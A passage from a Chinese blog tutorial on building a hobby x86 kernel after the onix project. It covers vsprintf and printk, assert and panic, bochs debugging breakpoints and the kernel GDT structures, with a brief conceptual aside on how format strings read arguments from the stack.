class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若格式转换指示符是 &#x27;n&#x27;</span></span><br><span class="line">        <span class="comment">// 表示要把到目前为止转换输出的字符数保存到对应参数指针指定的位置中</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            <span class="comment">// 首先利用 va_arg() 取得该参数指针</span></span><br><span class="line">            ip = va_arg(args, <span class="type">int</span> *);</span><br><span class="line">            <span class="comment">// 然后将已经转换好的字符数存入该指针所指的位置</span></span><br><span class="line">            *ip = (str - buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 若格式转换符不是 &#x27;%&#x27;，则表示格式字符串有错</span></span><br><span class="line">            <span class="keyword">if</span> (*fmt != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">                <span class="comment">// 直接将一个 &#x27;%&#x27; 写入输出串中</span></span><br><span class="line">                *str++ = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">            <span class="comment">// 如果格式转换符的位置处还有字符，则也直接将该字符写入输出串中</span></span><br><span class="line">            <span class="comment">// 然后继续循环处理格式字符串</span></span><br><span class="line">            <span class="keyword">if</span> (*fmt)</span><br><span class="line">                *str++ = *fmt;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 否则表示已经处理到格式字符串的结尾处，则退出循环</span></span><br><span class="line">                --fmt;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后在转换好的字符串结尾处添上字符串结束标志</span></span><br><span class="line">    *str = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回转换好的字符串长度值</span></span><br><span class="line">    i = str - buf;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果按格式输出字符串到 buf</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *buf, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以改写src/kernel/main.c了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    <span class="type">int</span> count=<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">while</span>(count--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// console_write(message, sizeof(message) - 1);</span></span><br><span class="line">        printk(<span class="string">&quot;hello xsys %#010d\n&quot;</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/42015c0fa9cff310d93ad12d93c993a4.png" alt="image-20220306165753726" /></p><h2 id="字符串格式化漏洞の一点补充"><a class="markdownIt-Anchor" href="#字符串格式化漏洞の一点补充"></a> 字符串格式化漏洞の一点补充</h2><p>在之前的<a href="https://blog.joe1sn.top/2019/11/17/fsb/">文章</a>里面讲过了，但是这次可以从新的视角出发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> msg[] = <span class="string">&quot;XSYS\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello %d %s %d %d\n&quot;</span>, a, msg, <span class="number">0xaa</span>, <span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://img.joe1sn.top/uploads/big/f8d58090407cbc5c6e89c3fe14bb7c0c.png" alt="image-20220306170318384" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -g -o test test.c</span><br></pre></td></tr></table></figure><p>这里使用32位是为了不让参数传到寄存器中，这样参数在栈上面方便调试</p><img src="https://img.joe1sn.top/uploads/big/9e57747157dff0bb248cc06a4eca82d0.png" alt="image-20220306170653504" style="zoom:67%;" /><p>gcc这里使用的时标准的<code>cdecl</code>(c declearation)，所以我们的参数是从右往左入栈，及图中的4个push</p><p>在call之前的栈如下</p><img src="https://img.joe1sn.top/uploads/big/0b637301dbea9c56af6680b6ccd313a3.png" alt="image-20220306170920947" style="zoom: 60%;" /><p>所以当vsprintf检测到格式化字符串时，他就会将栈顶的值按照提前预定的格式输出出来。</p><p>所以对字符串格式化漏洞利用来说，重要的是<code>call vsprintf</code>时，栈的情况</p><h1 id="操作系统实现-断言与调试"><a class="markdownIt-Anchor" href="#操作系统实现-断言与调试"></a> 操作系统实现-断言与调试</h1><blockquote><p>代码来源：<a href="https://github.com/StevenBaby/onix">https://github.com/StevenBaby/onix</a></p><p>相关课程：<a href="https://www.bilibili.com/video/BV1gR4y1u7or">https://www.bilibili.com/video/BV1gR4y1u7or</a></p><p>感谢B站UP：<a href="https://space.bilibili.com/491131440">踌躇月光</a> 带来的相关代码和教程</p></blockquote><h2 id="断言"><a class="markdownIt-Anchor" href="#断言"></a> 断言</h2><p>如果要判断一个条件是否成立，可以有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">exp</span>)</span><br><span class="line">    ....;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ERROR;</span><br></pre></td></tr></table></figure><p>每个判断都这样写的话会导致代码异常难读，所以可以使用一个函数<code>assert()</code>来实现</p><p>而我们的<code>assert()</code>肯定要打印出错的代码文件、哪一行、报错提示信息</p><p>不过还好之前我们在<code>printk</code>中实现了这一点</p><p><code>src/include/xsys/assert.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_ASSERT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_ASSERT_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">assertion_failure</span><span class="params">(<span class="type">char</span> *<span class="built_in">exp</span>, <span class="type">char</span> *file, <span class="type">char</span> *base, <span class="type">int</span> line)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(exp) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (exp)        \</span></span><br><span class="line"><span class="meta">        ;           \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>            \</span></span><br><span class="line"><span class="meta">        assertion_failure(#exp, __FILE__, __BASE_FILE__, __LINE__)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/assert.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/printk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u8 buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">assertion_failure</span><span class="params">(<span class="type">char</span> *<span class="built_in">exp</span>, <span class="type">char</span> *file, <span class="type">char</span> *base, <span class="type">int</span> line)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(</span><br><span class="line">        <span class="string">&quot;\n--&gt; assert(%s) failed!!!\n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; file: %s \n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; base: %s \n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; line: %d \n&quot;</span>,</span><br><span class="line">        <span class="built_in">exp</span>, file, base, line);</span><br><span class="line"></span><br><span class="line">    spin(<span class="string">&quot;assertion_failure()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能走到这里，否则出错；</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;ud2&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;xsys/global.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    assert(<span class="number">3</span>&lt;<span class="number">5</span>);</span><br><span class="line">    assert(<span class="number">3</span>&gt;<span class="number">5</span>);    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5c6e29057af8c113919c625853075589.png" alt="image-20220307221825131" /></p><h2 id="panic-慌乱"><a class="markdownIt-Anchor" href="#panic-慌乱"></a> PANIC 慌乱</h2><p>当我们代码过多，测试阶段不可避免地会写一些bug，可能导致例如：x/0这种，会触发系统的崩溃，所以我们要对这种致命错误(Fatal Error)要有处理</p><p><code>src/kernel/assert.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line">    va_end(args);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;!!! panic !!!\n--&gt; %s \n&quot;</span>, buf);</span><br><span class="line">    spin(<span class="string">&quot;panic()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能走到这里，否则出错；</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;ud2&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;xsys/global.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    panic(<span class="string">&quot;test!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/1d0ff1986f33dcab8b121e4b90a8d1ee.png" alt="image-20220307222235079" /></p><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><p>bochs中的断点是：<code>xchg bx,bx</code></p><p>所以我们通过裸汇编来实现断点，同时显示停止在了那个文件的哪一行</p><p><code>src/include/xsys/debug.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_DEBUG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_DEBUG_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">debug_k</span><span class="params">(<span class="type">char</span>* file, <span class="type">int</span> line, <span class="type">const</span> <span class="type">char</span>* fmt, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BMB asm volatile (<span class="string">&quot;xchgw %bx, %bx&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUGK(fmt, args...) debug_k(__BASE_FILE__, __LINE__, fmt, ##args)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/debug.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/printk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">debug_k</span><span class="params">(<span class="type">char</span>* file, <span class="type">int</span> line, <span class="type">const</span> <span class="type">char</span>* fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line">    printk(<span class="string">&quot;[%s] [%d] %s&quot;</span>, file, line, fmt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    BMB;</span><br><span class="line">    assert(<span class="number">3</span>&lt;<span class="number">5</span>);</span><br><span class="line">    DEBUGK(<span class="string">&quot;debug test&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/55475a9acc2eb90301df627fe4bc5129.png" alt="image-20220307222700531" /></p><h1 id="操作系统实现-内核全局描述符进程调度及上下文切换"><a class="markdownIt-Anchor" href="#操作系统实现-内核全局描述符进程调度及上下文切换"></a> 操作系统实现-内核全局描述符|进程调度及上下文切换</h1><h2 id="内核全局描述符"><a class="markdownIt-Anchor" href="#内核全局描述符"></a> 内核全局描述符</h2><p>将<code>loader.asm</code>里面全局描述功能放到内核里面（确实，你不觉得这样汇编一位一位的设置很麻烦吗？）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">descriptor_t</span> gdt[GDT_SIZE]; <span class="comment">// 内核全局描述符表</span></span><br><span class="line"><span class="type">pointer_t</span> gdt_ptr;      <span class="comment">// 内核全局描述符表指针</span></span><br></pre></td></tr></table></figure><p>之前的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lgdt [gdt_ptr]; 加载 gdt</span><br><span class="line">sgdt [gdt_ptr]; 保存 gdt</span><br></pre></td></tr></table></figure><p><code>src/include/xsys/global.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ONIX_GLOBAL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONIX_GLOBAL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDT_SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">descriptor_t</span> /* 共 8 个字节 */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> limit_low;      <span class="comment">// 段界限 0 ~ 15 位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base_low : <span class="number">24</span>;    <span class="comment">// 基地址 0 ~ 23 位 16M</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> type : <span class="number">4</span>;        <span class="comment">// 段类型</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> segment : <span class="number">1</span>;     <span class="comment">// 1 表示代码段或数据段，0 表示系统段</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> DPL : <span class="number">2</span>;         <span class="comment">// Descriptor Privilege Level 描述符特权等级 0 ~ 3</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> present : <span class="number">1</span>;     <span class="comment">// 存在位，1 在内存中，0 在磁盘上</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> limit_high : <span class="number">4</span>;  <span class="comment">// 段界限 16 ~ 19;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> available : <span class="number">1</span>;   <span class="comment">// 该安排的都安排了，送给操作系统吧</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> long_mode : <span class="number">1</span>;   <span class="comment">// 64 位扩展标志</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> big : <span class="number">1</span>;         <span class="comment">// 32 位 还是 16 位;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> granularity : <span class="number">1</span>; <span class="comment">// 粒度 4KB 或 1B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> base_high;       <span class="comment">// 基地址 24 ~ 31 位</span></span><br><span class="line">&#125; _packed <span class="type">descriptor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 段选择子</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">selector_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u8 RPL : <span class="number">2</span>;</span><br><span class="line">    u8 TI : <span class="number">1</span>;</span><br><span class="line">    u16 index : <span class="number">13</span>;</span><br><span class="line">&#125; <span class="type">selector_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pointer_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u16 limit;</span><br><span class="line">    u32 base;</span><br><span class="line">&#125; _packed <span class="type">pointer_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gdt_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/global.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">descriptor_t</span> gdt[GDT_SIZE]; <span class="comment">// 内核全局描述符表</span></span><br><span class="line"><span class="type">pointer_t</span> gdt_ptr;          <span class="comment">// 内核全局描述符表指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化内核全局描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gdt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    BMB;</span><br><span class="line">    DEBUGK(<span 